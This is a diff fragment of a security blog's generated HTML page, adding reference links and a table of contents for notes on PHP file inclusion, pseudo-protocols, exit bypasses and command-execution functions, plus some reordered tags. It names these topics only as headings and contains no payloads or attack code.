+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120695429">PHP伪协议详解-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ40KI++xiKYt44x&alichlgref=https://xz.aliyun.com/t/8163#toc-2">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/266565.html">探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73734159/article/details/131054466">SWPUCTF 2021 新生赛]easyrce-解题思路-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fm411C7fq/?spm_id_from=333.1007.tianma.20-4-78.click&vd_source=a682c5ef106d033687540c4da28a54f1">30分钟正则表达式教程 - 哔哩哔哩_bilibili</a></p>
+
     
 
     
@@ -451,7 +801,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%90%84%E7%A7%8D%E6%AF%94%E8%BE%83%EF%BC%88%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%8C%E5%85%B6%E5%AE%83%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0%E5%92%8C%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">1. 各种比较（强弱比较，其它比较函数和方法）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java"><span class="toc-number">2.</span> <span class="toc-text">Java</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">1.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%90%84%E7%A7%8D%E6%AF%94%E8%BE%83%EF%BC%88%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%8C%E5%85%B6%E5%AE%83%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0%E5%92%8C%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">1. 各种比较（强弱比较，其它比较函数和方法）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.</span> <span class="toc-text">2. 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 本地文件包含（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">2.1.1 常见的敏感文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.1.2 目录穿越漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 远程文件包含（RFI）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.</span> <span class="toc-text">3. PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 php:&#x2F;&#x2F;协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-php-filter%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">3.2.1 php:&#x2F;&#x2F;filter协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%AD%BB%E4%BA%A1exit%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 死亡exit的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-base64-decode%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">3.3.1 base64-decode绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-string-rot13%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">3.3.2 string.rot13绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-3-string-strip-tags%E9%85%8D%E5%90%88Base64%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">3.3.3 string.strip_tags配合Base64绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-4-htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E5%BE%85%E5%AD%A6%E4%B9%A0%EF%BC%89"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">3.3.4 .htaccess的预包含利用（待学习）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-5-bypass%E7%9B%B8%E5%90%8C%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">3.3.5 bypass相同变量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-5-1-Base64%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.1.</span> <span class="toc-text">3.3.5.1 Base64绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-5-2-string-rot13%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.2.</span> <span class="toc-text">3.3.5.2 string.rot13绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-5-3-convert-iconv-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.3.</span> <span class="toc-text">3.3.5.3 convert.iconv.*绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3-5-3-1-UCS-2%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.3.1.</span> <span class="toc-text">3.3.5.3.1 UCS-2绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3-5-3-2-UCS-4%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.3.2.</span> <span class="toc-text">3.3.5.3.2 UCS-4绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3-5-3-3-UTF-8-UTF-7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.3.3.</span> <span class="toc-text">3.3.5.3.3 UTF-8&amp;UTF-7绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-6-%E6%9D%82%E7%B3%85%E4%BB%A3%E7%A0%81%E6%B3%A8%E9%87%8A"><span class="toc-number">1.3.3.6.</span> <span class="toc-text">3.3.6 杂糅代码注释</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.</span> <span class="toc-text">4. 外部命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-exec"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-passthru"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-system"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.3 system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E5%8F%8D%E6%92%87%E5%8F%B7-%E5%92%8Cshell-exec"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.4 反撇号&#96;和shell_exec()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java"><span class="toc-number">2.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">补充知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-Regular-Expression"><span class="toc-number">3.1.</span> <span class="toc-text">1. 正则表达式 (Regular Expression)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BD%8D%E7%BD%AE%E4%B8%8E%E8%BE%B9%E7%95%8C%E5%8C%B9%E9%85%8D"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.1 位置与边界匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E9%87%8F%E8%AF%8D"><span class="toc-number">3.1.2.</span> <span class="toc-text">1.2 量词</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E5%88%86%E7%BB%84%E5%92%8C%E5%BC%95%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">1.3 分组和引用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-1-%E5%88%86%E7%BB%84%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">1.3.1 分组替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-2-%E9%9D%9E%E6%8D%95%E8%8E%B7%E5%88%86%E7%BB%84"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">1.3.2 非捕获分组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-3-%E5%88%86%E7%BB%84%E7%9A%84%E5%BC%95%E7%94%A8"><span class="toc-number">3.1.3.3.</span> <span class="toc-text">1.3.3 分组的引用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E5%89%8D%E7%9E%BB%E5%92%8C%E5%90%8E%E9%A1%BE"><span class="toc-number">3.1.4.</span> <span class="toc-text">1.4 前瞻和后顾</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-1-%E6%AD%A3%E5%90%91%E5%89%8D%E7%9E%BB-%E8%B4%9F%E5%90%91%E5%89%8D%E7%9E%BB"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">1.4.1 正向前瞻&amp;负向前瞻</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-2-%E6%AD%A3%E5%90%91%E5%90%8E%E9%A1%BE-%E8%B4%9F%E5%90%91%E5%90%8E%E9%A1%BE"><span class="toc-number">3.1.4.2.</span> <span class="toc-text">1.4.2 正向后顾&amp;负向后顾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">3.1.5.</span> <span class="toc-text">1.5 版本问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-%E7%BD%91%E9%A1%B5"><span class="toc-number">4.</span> <span class="toc-text">参考文章&#x2F;网页</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -630,6 +980,10 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">入门...大概？</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Writeup</a>
               </li>
              
@@ -638,19 +992,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">入门...大概？</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随想</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Web3</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -662,7 +1004,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
+                <a href="javascript:void(0)" class="js-tag color5">Web3</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -675,6 +1021,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">胡思乱想</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
               </li>
             
             <div class="clearfix"></div>
@@ -727,7 +1077,7 @@
           
             <li class="search-li">
               <a href="https://hasegawaazusa.github.io/" target="_blank" 
-                class="search-title" title="这是我爹，你们都不许和我抢！！！～(　TロT)σ">
+                class="search-title" title="这是我爹，你们都不许和我抢！！！">
                 
                   <img src="https://hasegawaazusa.github.io/images/android-chrome-144x144.png">
                 
